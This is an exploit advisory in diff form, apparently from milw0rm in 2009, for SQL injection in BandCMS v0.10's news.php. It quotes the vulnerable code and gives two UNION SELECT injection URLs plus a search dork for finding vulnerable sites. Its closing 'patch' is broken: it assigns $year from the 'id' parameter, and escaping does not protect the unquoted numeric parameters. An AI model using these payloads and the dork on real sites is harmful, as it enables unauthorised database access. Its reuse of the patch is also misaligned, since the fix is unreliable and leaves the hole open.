@@ -1,0 +1,51 @@
+#################################################################
+#	 _______ _________ _       				#
+#       (  ____ )\__   __/( (    /|				#
+#	| (    )|   ) (   |  \  ( |				#
+#	| (____)|   | |   |   \ | |				#
+#	|     __)   | |   | (\ \) |				#
+#	| (\ (      | |   | | \   |				#
+#	| ) \ \__   | |   | )  \  |				#
+#	|/   \__/   )_(   |/    )_)				#
+#       	http://root-the.net 				#
+#################################################################
+#[+] BandCMS v0.10 news.php Milti SQL Injection Vulnerabilities	#
+#[+] Vendor : http://rockband.sourceforge.net/			#
+#[+] Exploit : Affix <root@root-the.net>			#
+#[+] Dork : "Powered by Rock Band CMS 0.10"			#
+#[+] Greetz : Mad-Hatter, Atomiku, RTN, Terogen, SCD, Boxhead,  #
+#	      	  str0ke, tekto, raT, uNkn0wn.ws, ryan1918.com	#
+#################################################################
+#	BandCMS v0.10 Has an SQL Injection in news.php 		#
+#								#
+#	Code :							#
+#	 if(isset($_GET['year'])){				#
+#		$year = $_GET['year'];				#
+#		$smarty->assign('news', $db->getNewsYear($year));
+#	}							#
+#								#
+#								#
+#	Exploit :						#
+#	http://site.com/news.php?year=-2004+UNION+SELECT+1,2,3,4--
+#								#
+#								#
+#	Code :							#
+#	    $id = $_GET['id'];					#
+#	    $newsItem = $db->getNewsItem($id);			#
+#	    $smarty->assign('news', $newsItem);			#
+#								#
+#	Exploit :						#
+#	http://site.com/news.php?id=-1+UNION+SELECT+1,2,3,4--	#
+#								#
+#								#
+#	Patch :							#
+#	Since Im a Nice guy here is a change both variables as	#
+#	follows							#
+#								#
+#  $year = addslashes(mysql_real_escape_string($_GET['year']));	#
+#								#
+#	$year = addslashes(mysql_real_escape_string($_GET['id']));
+#								#
+#################################################################
+
+# milw0rm.com [2009-08-31]
